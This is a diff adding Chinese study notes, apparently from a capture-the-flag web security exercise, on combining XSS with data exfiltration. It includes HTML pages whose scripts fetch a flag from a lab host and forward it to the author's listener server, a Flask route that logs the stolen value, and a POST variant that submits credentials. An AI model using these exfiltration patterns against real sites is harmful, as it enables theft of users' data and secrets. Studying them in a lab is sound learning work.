@@ -855,15 +855,90 @@ https://flask.palletsprojects.com/en/stable/
 >
 > ​	这是比较复杂的.
 
+**XSS（跨站脚本）+ 数据外泄（Exfiltration）模拟**
 
+比如一个client访问页面:
 
+```html
+<!DOCTYPE html>
+<html>
+    <head><title>GOGOGO</title></head>
+    <body>
+        <script src="http://challenge.localhost:80/gate"></script>
+        <script>
+            fetch("http://challenge.localhost:1337/log?flag=" + encodeURIComponent(flag))
+        </script>
+    </body>
+</html>
+```
 
+​	第一行执行了另一个网站的脚本,并返回flag,第二行用fetch不动声色的泄露信息,把这个flag传送到我自己的server上面去.
 
+接着我的server会把获取到的信息打印出来:
 
+```py
+@app.route("/log", methods=["GET"])
+def find_flag():
+    flag = flask.request.args.get("flag", "")
+    print(f"[+] Exfiltrated flag: {flag}")
+    return "Flag received", 200
+```
 
+我们经常会使用fetch语句:
 
+```js
+fetch("http://google.com")
+    .then(response => response.text())
+    .then(website_content => ???)
+```
 
+那么如果Server返回的不是一个脚本而是纯文本我们怎么传输:
 
+```html
+<!DOCTYPE html>
+<html>
+    <head><title>GOGOGO</title></head>
+    <body>
+        <script>
+            fetch("http://challenge.localhost:80/verify")
+                .then(response => response.text())
+                .then(flag => {
+                     fetch("http://challenge.localhost:1337/log?flag=" + encodeURIComponent(flag))
+                });
+        </script>
+    </body>
+</html>
+```
+
+先用fetch拿到response的数据,接着再去进行链式调用.
+
+同样的,你也可以在verify后加一些参数.
+
+我们还可以用fetch做POST请求:
+
+```js
+<!DOCTYPE html>
+<html>
+    <head><title>GOGOGO</title></head>
+    <body>
+        <script>
+            fetch("http://challenge.localhost:80/verify", {
+               method:"POST",
+               headers:{
+                "Content-Type":"application/x-www-form-urlencoded"
+               },
+               body:"unlock_code=chrzavej&secure_key=vwzljzcv&private_key=leqhqzzg"
+            })
+            .then(response => response.text())
+            .then(flag => {
+                     fetch("http://challenge.localhost:1337/log?flag=" + encodeURIComponent(flag))
+                });
+        </script>
+    </body>
+</html>
+```
+
+这个就是类似于lambda的函数.
 
 
 
